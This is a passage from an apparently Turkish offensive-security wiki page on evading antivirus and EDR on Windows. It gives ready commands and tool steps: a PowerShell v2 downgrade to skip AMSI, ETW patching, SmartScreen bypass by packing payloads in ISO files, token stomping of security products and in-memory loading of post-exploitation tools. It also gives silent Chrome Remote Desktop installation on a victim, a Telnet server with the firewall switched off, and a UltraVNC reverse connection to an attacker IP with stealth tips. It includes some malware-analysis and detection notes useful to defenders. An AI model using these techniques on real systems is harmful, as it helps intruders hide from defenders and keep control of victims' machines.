PowerShell sürüm 2'yi kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şöyle yapabilirsiniz:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Denetim ve sorun giderme amaçları için yararlı olabilir, ancak **tespit edilmekten kaçınmak isteyen saldırganlar için bir sorun da oluşturabilir**.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakma**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell version 2 kullanma**: PowerShell version 2 kullanırsanız AMSI yüklenmez, bu nedenle script'lerinizi AMSI taramasına takılmadan çalıştırabilirsiniz. Şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Yönetilmeyen bir PowerShell oturumu kullanma**: `powershell.exe` dosyasını başlatmadan PowerShell'i barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` yaklaşımında olduğu gibi). Bu, özellikle `powershell.exe` işlemine bağlı kontrollerden kaçınır; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz. Kapsam, runtime'a ve host uygulamasına bağlıdır.


## Obfuscation

> [!TIP]
> Bazı obfuscation teknikleri verileri şifrelemeye dayanır. Bu, binary'nin entropisini artırarak AV'lerin ve EDR'lerin onu daha kolay tespit etmesini sağlar. Bu konuda dikkatli olun ve şifrelemeyi yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulayın.

### ConfuserEx ile Korunan .NET Binary'lerini Deobfuscate Etme

ConfuserEx 2 (veya ticari fork'larını) kullanan malware'i analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarla C#'a decompile edilebilecek **orijinale yakın bir IL'yi** güvenilir biçimde geri yükler.<sup>[[10]](#references)</sup>

1.  Anti-tampering'i kaldırma – ConfuserEx her *method body*'yi şifreler ve şifreyi `<Module>.cctor` içindeki *module* static constructor'da çözer. Ayrıca PE checksum'ı yamalayarak herhangi bir değişikliğin binary'nin çökmesine neden olmasını sağlar. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yazmak için **AntiTamperKiller** kullanın:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Çıktı, kendi unpacker’ınızı oluştururken işinize yarayabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / kontrol akışı kurtarma – *temiz* dosyayı **de4dot-cex**’e (de4dot’un ConfuserEx’i destekleyen bir fork’u) verin.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profilini seçer
     • de4dot, control-flow flattening işlemini geri alır, özgün namespace'leri, sınıfları ve değişken adlarını geri yükler ve sabit dizeleri çözer.

3.  Proxy-call stripping – ConfuserEx, decompilation işlemini daha da zorlaştırmak için doğrudan method çağrılarını hafif sarmalayıcılarla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Bu adımdan sonra opak wrapper işlevleri (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API’lerini görmelisiniz.

4.  Manuel temizleme – elde edilen binary’yi dnSpy altında çalıştırın ve gerçek payload’ı bulmak için büyük Base64 blob’larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware bunu çoğu zaman `<Module>.byte_0` içinde başlatılan TLV kodlu bir byte array olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırmaya **gerek kalmadan** yürütme akışını geri yükler – çevrimdışı bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak triyaj etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.

#### Tek satırlık komut
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla yazılım güvenliğini artırabilen, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir harici araç kullanmadan ve derleyiciyi değiştirmeden, derleme zamanında obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılabileceğini gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı kırmak isteyen kişinin işini biraz zorlaştıracak, C++ template metaprogramming framework tarafından üretilen obfuscated operasyonlardan oluşan bir katman ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil olmak üzere çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, herhangi bir yürütülebilir dosya için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM destekli diller için geliştirilmiş, ince ayrıntılı bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP chain'lerine dönüştürerek programı assembly code düzeyinde obfuscate eder ve normal control flow'a ilişkin doğal algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürüp ardından yükleyebilir.

### LLVM compiler-assisted per-function self-masking

Tüm implantı yalnızca uyku sırasında maskelemek yerine, değiştirilmiş bir LLVM X86 backend, seçili fonksiyonları etkin olmadıkları sürece XOR-maskeli tutabilir. Function Peekaboo PoC, adları demangle edildiğinde `REG_` içeren fonksiyonları seçer, son machine code'un etrafına konumdan bağımsız giriş/çıkış stub'ları ekler ve `.text` içine ortak bir masking handler yerleştirir; source-level signatures ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Bu işlem, instruction selection ve optimizasyondan sonra yapılmalıdır; çünkü dönüşümün **üretilen her return'ü** kapsaması ve kesin x86 yerleşimini bilmesi gerekir. Emission öncesi bir `MachineFunctionPass`, son `MachineInstr::isReturn()` talimatını bulur, son yolun eklenen epilogue'a düşmesi için bu talimatı siler ve daha önceki return talimatlarını `JMP_1 handler` ile değiştirir. Her return'den önce derleyicinin ürettiği stack/frame teardown talimatlarını koruyun; yalnızca return talimatının kendisini yönlendirin.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `emitFunctionBodyEnd()` fonksiyon başına stub'ları, `emitEndOfAsmFile()` ise handler'ı üretir. Emission aşamaları arasında paylaşılan semboller, prologue branch'inin daha sonra üretilecek epilogue'u hedeflemesini sağlar; elle üretilen bir near `je` için `0F 84` yazın ve ardından dört baytlık MC expression `target - address_after_je` ekleyin. Handler'a yapılan çağrı ve atlamalar bunun yerine `MCInst` nesneleri (`CALL64pcrel32` ve `JMP_1`) olarak üretilebilir. Bir pass, hiçbir değişiklik yapmadığı seçilmemiş bir fonksiyon için `false` döndürmelidir; PoC bu durumda hatalı biçimde `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata ve pre-CRT initialization

PoC, `.funcmeta` içine bir XOR key ve loader tarafından relocate edilmiş bir function pointer ile runtime length içeren 16 baytlık kayıtlar yerleştirir. C alanı `uint32_t` olsa da handler, kayıt ofseti `+8` konumundaki QWORD'a erişerek length değerini ve padding'ini tüketir; kayıtları `0x10` aralıklarla ilerletir. PE section adları yalnızca sekiz bayt olduğundan, runtime lookup `.funcmet` adını görür. Harici bir patcher, çalıştırılabilir bir `.stub` ekler, eski entry-point RVA'yı stub içine kaydeder ve `AddressOfEntryPoint` değerini yönlendirir; PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` üzerinden alır, zaten import edilmiş bir `VirtualProtect` fonksiyonunu çözmek için PE32+ imports tablosunu dolaşır ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` içine bir sentinel yazar ve metadata'daki tüm fonksiyonları çağırır. Sürekli okunabilir durumda kalan prologue, fonksiyon başlangıcını `gs:[0xF0]` içine kaydeder, sentinel'ı kontrol eder ve henüz maskelenmemiş body'yi atlar. Ardından epilogue `call handler` kullanır; handler 13 register'ı (`0x68` bayt) kaydettikten sonra `[rsp+0x68]` konumundaki return address, dönüştürülmüş fonksiyonun sonunu gösterir; böylece `end - start` değeri metadata kaydına yazılabilir. Tüm body'ler maskelendikten sonra stub sentinel'ı temizler ve `ImageBase + original_entry_point_RVA` adresine atlar.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir çağrı sırasında prologue, body'nin maskesini kaldırmak için aynı simetrik handler'ı çağırır. Son yol eklenen epilogue'a düşerken, daha önceki tüm return'ler doğrudan ortak handler'a atlar. Normal epilogue da `call` yerine `jmp handler` kullanır; böylece yeniden maskeleme sonrasında handler'ın `ret` talimatı, çağıranın orijinal return address'ini kullanır ve fonksiyon sonucunu `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive ve analiz göstergeleri

Handler geçerli kaydı bulur, sabit görünür prologue'u (bu build'de `0x46` bayt) atlar, geri kalan kısmın korumasını `PAGE_EXECUTE_READWRITE` olarak değiştirir, düşük key baytını kullanarak her bayta XOR uygular ve ardından korumayı `PAGE_EXECUTE_READ` olarak ayarlar. Dolayısıyla aynı döngü, girişte maskeyi kaldırır ve her normal çıkışta yeniden maskeler.<sup>[[38]](#references)[[39]](#references)</sup>

Bu tasarımın güçlü göstergeleri şunlardır:<sup>[[38]](#references)[[39]](#references)</sup>

- çalıştırılabilir bir `.stub` içindeki entry point ve bir key ile relocate edilmiş `.text` pointer'larını içeren `.funcmet` section'ı;
- pre-CRT PEB, import-table ve section-table ayrıştırmasının ardından her metadata pointer'ı üzerinden yapılan çağrılar;
- aynı `call`/`pop` PIC prologue'ları ve tek bir handler'a yönlendirilen çok sayıda return noktası;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` adreslerine yazımların ardından tekrarlanan `VirtualProtect` geçişleri ve image-backed executable page'lere yapılan bayt bayt XOR yazımları.

Bu, memory-scanner evasion'dır; kriptografik koruma değildir: patch'lenmiş dosya hâlâ orijinal, maskelenmemiş body'yi içerir ve debugger ile `VirtualProtect` veya XOR döngüsünde breakpoint koyup etkin fonksiyon dökülebilir. Tek baytlık XOR, okunabilir metadata ve sabit `0x46` sınırı da offline kurtarmayı kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'nin TEB slot'ları thread-local'dır, ancak değiştirilmiş code page'leri process-wide'dır. Bu nedenle eşzamanlı veya recursive giriş, başka bir çağrı yürütülürken talimatların maskesinin tekrar değiştirilmesine yol açabilir; exceptions ve nonlocal exits da yeniden maskelemeyi atlayabilir. Sağlam bir implementation, geçişleri senkronize etmeli, `lpflOldProtect` üzerinden döndürülen gerçek korumayı geri yüklemeli, hard-coded stub uzunluklarından kaçınmalı, x64 stack alignment için hem `call` hem de `jmp` yollarını denetlemeli ve executable byte'ları yeniden yazdıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, executable code değiştirildiğinde instruction-cache tutarlılığının sağlanması sorumluluğunu açıkça çağırana verir.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak zararlı uygulamaları çalıştırmaya karşı korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen esas olarak itibara dayalı bir yaklaşım kullanır; bu nedenle nadir indirilen uygulamalar SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve dosyayı çalıştırmasını engeller (ancak More Info -> Run anyway seçeneğine tıklayarak dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir. İnternetten indirilen dosyalar için, dosyanın indirildiği URL ile birlikte otomatik olarak oluşturulur.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir signing certificate ile imzalanmış yürütülebilir dosyaların **SmartScreen'i tetiklemeyeceğini** unutmayın.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili bir yolu, onları ISO gibi bir tür container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **NTFS olmayan** volume'lara uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'i atlatmak için payload'ları çıktı container'larına paketleyen bir araçtır.

Örnek kullanım:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

SmartScreen'i, [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) kullanarak payload'ları ISO dosyalarının içine paketleyip bypass etmeye yönelik bir demo:

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları kaydetmesini** sağlayan güçlü bir günlükleme mekanizmasıdır. Bununla birlikte güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, kullanıcı alanındaki süreçte bulunan **`EtwEventWrite`** işlevinin hiçbir olay kaydetmeden hemen dönmesini sağlamak da mümkündür. Bunun için işlev bellekte yamalanarak hemen dönecek şekilde ayarlanır; böylece o süreç için ETW günlüklemesi etkili bir biçimde devre dışı bırakılır.

Daha fazla bilgi için **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** sayfalarına bakabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary'lerini belleğe yükleme yöntemi uzun zamandır biliniyor ve AV'ye yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ çok etkili bir yol.

Payload diske dokunmadan doğrudan belleğe yükleneceğinden, yalnızca tüm süreç için AMSI'yi yamalamamız gerekecek.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma imkânı sunuyor; ancak bunu yapmanın farklı yolları var:

- **Fork\&Run**

Bu yöntemde **yeni bir feda edilebilir süreç başlatılır**, post-exploitation amaçlı kötü amaçlı kodunuz bu yeni sürece enjekte edilir ve çalıştırılır; işlem tamamlandığında yeni süreç sonlandırılır. Bu yöntemin hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, çalıştırmanın Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eylemlerimiz sırasında bir şeyler ters giderse veya tespit edilirsek **implantımızın hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Davranışsal Tespitlere** yakalanma olasılığınızın **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntemde post-exploitation amaçlı kötü amaçlı kod **kendi sürecine** enjekte edilir. Böylece yeni bir süreç oluşturup AV'ye taratmanız gerekmez; ancak payload'ınız çalışırken bir şeyler ters giderse, süreç çökebileceğinden **beacon'ınızı kaybetme olasılığınız çok daha yüksektir**.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek isterseniz şu makaleye [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'larına ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assembly'lerini **PowerShell üzerinden** de yükleyebilirsiniz. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'ın videosuna](https://www.youtube.com/watch?v=oe11Q-3Akuk) göz atın.

## NativeAOT WebAssembly repackaging of .NET tools (WasmForge)

Standart `execute-assembly` teknikleri, tanınabilir MSIL'i korur ve sonunda bir CLR başlatır. **WasmForge** bunun yerine çalıştırma altyapısını değiştirir: C# projesini deneysel NativeAOT-LLVM WASI hedefine taşır, önceden WebAssembly'ye derler ve bu modülü Wazero tabanlı bir Windows PE host'una gömer. Ortaya çıkan süreç hedefin CLR'ına, JIT'ine veya `dotnet` host'una ihtiyaç duymaz; bu nedenle yalnızca yönetilen assembly adlarına, CLR yüklemesine, AMSI'ye veya .NET ETW'ye dayanan kuralların doğrudan görünürlüğü azalır. Bu bir kaçınma/paketleme tekniğidir; ayrıcalık sınırını bypass etmez — guest, orijinal aracın izinlerini ve işletim sisteminde gözlemlenebilir davranışlarını korur.<sup>[[44]](#references)[[45]](#references)</sup>

### C# projesi oluşturma

Önerilen derleme yolu, .NET 10 SDK'sını, NativeAOT-LLVM workload'unu, WASI SDK 24.0'ı, linker'ı ve imzalama bağımlılıklarını içerdiği için projenin Docker ortamıdır. `.csproj` dosyası otomatik olarak algılanır; tek komutlu derleme, taşıma, uyumluluk yamalama, WASM derleme, PE oluşturma ve imzalama adımlarını gerçekleştirir.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Sorun giderme veya oluşturulan kodu inceleme için süreci `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` ve son olarak `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` adımlarına bölün. Derleme imajı ayrıca WASI Preview 2 bileşen kodlamasını önlemek ve gömülü runtime'ın beklediği düz modülü üretmek için bir `wasm-component-ld` sarmalayıcısı kullanır.<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# ile x64 Win32 arasında köprü kurma

Bu, şeffaf bir yeniden derleme değildir. NativeAOT-WASI, Windows odaklı BCL özelliklerinden yoksundur veya bunları değiştirir ve bir wasm32 guest normalde dört baytlık pointer yuvaları ayırırken x64 API'leri sekiz baytlık pointer'lar döndürebilir. WasmForge bu iki sorunu aşağıdaki oluşturulan katmanlarla ele alır:<sup>[[44]](#references)</sup>

1. Bir kaynak patcher, AOT'ye özgü anlamsal farklılıkları düzeltir ve desteklenmeyen registry, pipe, WMI, identity, directory-service, file-version, LSA ve benzeri çağrıları `Wf*` yardımcılarına yönlendirir.
2. Bir P/Invoke tarayıcısı, `[DllImport]` çağrılarının guest içinde belirtilen DLL'yi dinamik olarak yüklemek yerine, bağlı C bridge sembollerine bağlanması için NativeAOT `DirectPInvoke` eşlemeleri üretir.
3. Host'a bağlı pointer'lar C#'ta `ulong`, C'de ise `uint64_t` kullanır. Genel bir dispatcher çağrıyı host'un Win32 handler'ına iletir; `out8_mask`, üst yarıları korunması gereken gerçek sekiz baytlık çıktı yuvalarını işaretler. İşaretlenmemiş wasm32 biçimli çıktılar, x64 yazma işleminin bitişik dört baytı bozmasını önlemek için snapshot/restore koruması kullanır.
4. Ayrılmış host bridge'leri; LSA ticket-cache erişimi, yapılandırılmış sonuçlar içeren Kerberos/BCrypt işlemleri, TCP KDC trafiği ve LDAP sorguları gibi genel syscall dispatch'e uymayan işlemleri ele alır.

Örneğin, `version.dll!VerQueryValueW` için bir sarmalayıcı dört host adresi iletir ve 2 ile 3 bitlerini (`0xC`) ayarlar; çünkü value pointer ve length, sekiz baytlık çıktı yuvalarıdır. Sarmalayıcının kendisi genel kalır ve DLL adını, export adını, argümanları ve maskeyi `wf_call_v2`'ye iletir; host pointer çevirisini gerçekleştirir ve native API'yi çağırır.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Kısıtlamalar ve tespit pivotları

Reflection ağırlıklı kod, dinamik assembly yükleme, keyfi native callback'ler ve WASM belleğine döndürülen karmaşık x64 yapıları araç başına yamalar gerektirebilir veya tamamen başarısız olabilir. Genel WASI Preview 2 socket'leri no-op stub'lara da ulaşabilir; bu nedenle desteklenen araçlar protokole özgü host shim'leri kullanır. Özelliklerin eşdeğer olduğunu varsaymak yerine her komutu native bir build'e karşı doğrulayın.<sup>[[44]](#references)[[45]](#references)</sup>

Bu teknik, payload'u görünmez kılmak yerine telemetriyi başka yöne kaydırır. Tespit; WASM modülü içeren veya bellekte oluşturan bir PE'ye, Wazero benzeri runtime davranışlarına, olağandışı host/guest bellek ayırma ve kopyalama işlemlerine, genel doğrudan Win32 dispatch'ine, imzalama ve PE kaynak anomalilerine, ayrıca ortaya çıkan API çağrılarına ve ağ trafiğine yönelebilir. Bu nedenle CLR yükleme, AMSI veya .NET ETW olaylarının bulunmaması, bir sürecin zararsız olduğunun kanıtı olarak değerlendirilmemelidir.<sup>[[44]](#references)</sup>

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği gibi, ele geçirilmiş makineye **Saldırganın kontrolündeki SMB paylaşımında kurulu yorumlayıcı ortamına erişim vererek** diğer dillerle kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki Yorumlayıcı Binary'lerine ve ortama erişim vererek, ele geçirilmiş makinenin belleğinde bu dillerde **keyfi kod çalıştırabilirsiniz**.

Repo'da belirtildiği üzere: Defender hâlâ script'leri tarar, ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatma konusunda daha fazla esneklik** elde ederiz. Bu dillerde rastgele, obfuscation uygulanmamış reverse shell script'leriyle yapılan testler başarılı olmuştur.

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün access token'ını değiştirir. Token'ın ayrıcalıklarını azaltmak, sürecin çalışmasını sürdürürken ayrıcalıklı inceleme veya düzeltme işlemlerini gerçekleştirmesini engelleyebilir.

Bunu önlemek için Windows, **harici süreçlerin** güvenlik süreçlerinin token'larına handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılım Kullanma

### Chrome Remote Desktop

[**Bu blog gönderisinde**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, Chrome Remote Desktop'ı kurbanın bilgisayarına dağıtıp ardından bilgisayarın kontrolünü ele geçirmek ve kalıcılığı sürdürmek kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine tıklayın ve Windows MSI dosyasını indirmek için MSI dosyasına tıklayın.
2. Kurulum programını kurbanda sessizce çalıştırın (admin yetkisi gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına dönüp Next'e tıklayın. Sihirbaz yetkilendirme isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Gerekli düzenlemeleri yaparak sağlanan komutu çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi, GUI kullanmadan PIN'i ayarlar).

## Gelişmiş Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion çok karmaşık bir konudur; bazen tek bir sistemdeki birçok farklı telemetri kaynağını hesaba katmanız gerekir. Bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaşacağınız her ortamın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi önemle tavsiye ederim.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılmış bir başka harika konuşma.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi kısımları kötü amaçlı bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanarak, **Defender'ın hangi kısmı kötü amaçlı bulduğunu** tespit edene kadar **binary'nin parçalarını kaldırabilir** ve bu kısmı sizin için ayırabilirsiniz.\
Aynı **işi yapan** başka bir araç da hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık web üzerinden sunan [**avred**](https://github.com/dobin/avred)'dir.

### **Telnet Server**

Windows 10'a kadar tüm Windows sürümlerinde, (administrator olarak) yükleyebileceğiniz bir **Telnet server** bulunuyordu. Bunu şu şekilde yapabilirsiniz:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet portunu değiştir** (gizlilik) ve güvenlik duvarını devre dışı bırak:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup'ı değil, bin indirmelerini istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Ardından, _**winvnc.exe**_ binary dosyasını ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **kurbanın bilgisayarına** taşıyın

#### **Ters bağlantı**

**Saldırgan**, ters bir **VNC bağlantısı** yakalamaya **hazır** olması için `vncviewer.exe -listen 5900` binary dosyasını kendi **host**'unda **çalıştırmalıdır**. Ardından, **kurbanın bilgisayarında**: winvnc daemon'unu `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız

- Zaten çalışıyorsa `winvnc`'i başlatmayın; aksi hâlde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc`'i başlatmayın; aksi hâlde [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır
